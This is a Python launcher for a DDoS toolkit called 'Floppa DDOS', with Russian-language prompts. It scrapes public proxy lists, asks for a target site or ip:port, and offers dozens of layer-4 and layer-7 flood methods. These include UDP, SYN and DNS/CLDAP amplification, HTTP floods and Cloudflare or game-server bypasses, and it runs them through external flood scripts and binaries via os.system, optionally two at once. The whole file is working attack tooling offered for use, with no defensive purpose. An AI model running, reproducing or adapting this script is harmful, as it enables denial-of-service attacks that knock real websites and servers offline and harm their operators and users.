import requests,os,sys,time,pyfiglet
from threading import *


l4 = ["MEM", "UDP", "CHAR", "TCP", "FIVEM", "NTP", "SYN", "CONNECTION", "ARD", "MCBOT", "TS3", "MCPE", "VSE", "RDP", "MINECRAFT", "DNS", "CLDAP", "CPS", "VSE2", "VSE3", "OVH-SLAVIC", "UDPBYPASS", "UDPBYPASS2"]
l7 = ["GET", "ULTRA", "NUKER", "HTTP-RAW", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "APACHE", "HIT", "NULL", "BOMB", "XMLRPC", "PPS", "COOKIE", "BURST", "EVEN", "GSB", "DGB", "AVB", "CFB", "CFBUAM", "BYPASS"]

title = pyfiglet.figlet_format('Floppa DDOS', font = "slant")
print('Creators: Renegat, Krit')
print(title)


def mc1run(cmd):
    os.system(cmd)
def mc2run(cmd):
    os.system(cmd)

proxy_type = 0
upd = input(f'Обновить прокси?[y/n]: ')
if upd == 'y':
    if os.path.exists("files/proxies/proxies.txt")==True:
        os.remove("files/proxies/proxies.txt")
    proxy_type = input("0 = Все типы\n1 = http\n4 = socks4\n5 = socks5\nВведите тип прокси :")
    f = open('proxies.txt','w')
    proxy = requests.get(f'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://api.proxyscrape.com/?request=displayproxies&proxytype=http')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://api.openproxylist.xyz/http.txt')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://api.openproxylist.xyz/http.txt')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt')
    f.write(str(proxy.text))
    proxy = requests.get(f'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt')
    f.write(str(proxy.text))
    f.close


target = input('Введите url сайта/(ip:port): ')
attacktime = input('Введите время атаки в секундах: ')
layer = input("Введите уровень атаки (l4/l7): ")
if layer == "l7":
    print("Методы: ",l7)
    print('Для совмещения 2-х методов: method-combiner')
    method = input('Введите метод: ')
    if method == 'method-combiner':
        print('Выберите два Метода')
        mc1 = input('Метод1: ')
        mc2 = input('Метод2: ')
        if (mc1 in l4) or (mc2 in l4):
            print('Выбери два Layer7 метода.')
            sys.exit()
        if mc1!="NUKER" and mc1!="NUKER-PROXYLESS" and mc1!="ULTRA" and mc1!="HTTP-RAW":
            print('1 Метод')
            threads = input('Введите количество потоков: ')
            multiple = input('Введите количество пакетов отправляемых с одного IP: ')
            mc1cmd = str(f'python3 start.py {mc1} {target} 1 {threads} proxies.txt {multiple} {attacktime}')
        if mc1 == 'NUKER':
            print('1 Метод')
            proxied = input('С проксями?[y/n]: ')
            if proxied == 'y':
                mc1cmd = str(f'node website-nuker-proxied.js {target} {attacktime}')
            else:
                mc1cmd = str(f'node website-nuker.js {target} {attacktime}')
        if mc1 == 'HTTP-RAW':
            print('Flood started')
            mc1cmd = str(f'node HTTP-RAW.js {target} {attacktime}')
        if mc2!="NUKER" and mc2!="NUKER-PROXYLESS" and mc2!="ULTRA" and mc2!="HTTP-RAW":
            print('2 Метод')
            threads = input('Введите количество потоков: ')
            multiple = input('Введите количество пакетов отправляемых с одного IP: ')
            mc2cmd = str(f'python3 start.py {mc2} {target} 1 {threads} proxies.txt {multiple} {attacktime}')
        if mc2 == 'NUKER':
            proxied = input('С проксями?[y/n]: ')
            print('2 Метод')
            if proxied == 'y':
                mc2cmd = str(f'node website-nuker-proxied.js {target} {attacktime}')
            else:
                mc2cmd = str(f'node website-nuker.js {target} {attacktime}')
        if mc2 == 'HTTP-RAW':
            print('Flood started')
            mc2cmd = str(f'node HTTP-RAW.js {target} {attacktime}')
        t1 = Thread(target = mc1run, args = (mc1cmd,))
        t2 = Thread(target = mc2run, args = (mc2cmd,))
        t1.start()
        time.sleep(0.25)
        t2.start()
        t1.join()
        t2.join()
    if method in l7:
        if method == 'ULTRA':
            request = input('Введите количество запросов(default=5): ')
            os.system(f'node method.js {target} {attacktime} request {request}')
        elif method == 'NUKER':
            proxied = input('С проксями?[y/n]: ')
            if proxied == 'y':
                os.system(f'node website-nuker-proxied.js {target} {attacktime}')
            else:
                os.system(f'node website-nuker.js {target} {attacktime}')
        elif method == 'HTTP-RAW':
            print('Flood started')
            os.system(f'node HTTP-RAW.js {target} {attacktime}')
        else:
            threads = input('Введите количество потоков: ')
            multiple = input('Введите количество пакетов отправляемых с одного IP: ')
            os.system(f'python3 start.py {method} {target} {proxy_type} {threads} proxies.txt {multiple} {attacktime}')
        
if layer == "l4":
    print("Методы: ",l4)
    method = input(f'Введите метод: ')
    (ip, port) = target.split(':')
    if method in l4:
            if method == "VSE2":
               print(f'./vse2 {ip} {port}')
               os.system(f'./vse2 {ip} {port}')
            if method == "VSE3":
               threads = input(f'Введите количество потоков: ')
               os.system(f'./vse3 {ip} {threads} -1 {attacktime}')
            if method == "VSE4":
               os.system(f'./vse4 {ip} {port}')
            if method == "UDPBYPASS":
                threads = input(f'Введите количество потоков: ')
                bypass = input('Выберите bypass(cs16,fivem,fivem2,gmod,csgo,ts3,amongus,source): ')
                #./udpbypass <Target IP/24/MIN/MAX CLASS> <DST PORT/0 FOR RANDOM> <SRC PORT/0 FOR RANDOM> <127.0.0.1/32 / 0 FOR RANDOM> <THREAD> <PPS LIMIT, -1 NO LIMIT> <TIME> <cs16,fivem,fivem2,gmod,csgo,ts3,amongus,source>
                os.system(f'./udpbypass {ip} {port} 0 0 {threads} -1 {attacktime} {bypass}')
            if method == "UDPBYPASS2":
                threads = input(f'Введите количество потоков: ')
                os.system(f'./udpbypass2 {ip} {threads} 99999 {attacktime}')
            if method == "OVH-SLAVIC":
                threads = input(f'Введите количество потоков: ')
                packet_size = input(f'Введите размер потоков: ')
                os.system(f'./ovh-slavic {ip} {port} {packet_size} {threads} -1 {attacktime}')
            if method != "VSE2" and method != "VSE3" and method != "VSE4" and method != "UDPBYPASS" and method != "UDPBUPASS2" and method != "OVH-SLAVIC":
                threads = input(f'Введите количество потоков: ')
                proxied = input('С проксями?[y/n]: ')
                if proxied == 'y':
                    os.system(f'python3 start.py {method} {target} {threads} {attacktime} {proxy_type} proxies.txt')
                else:
                    os.system(f'python3 start.py {method} {target} {threads} {attacktime}')
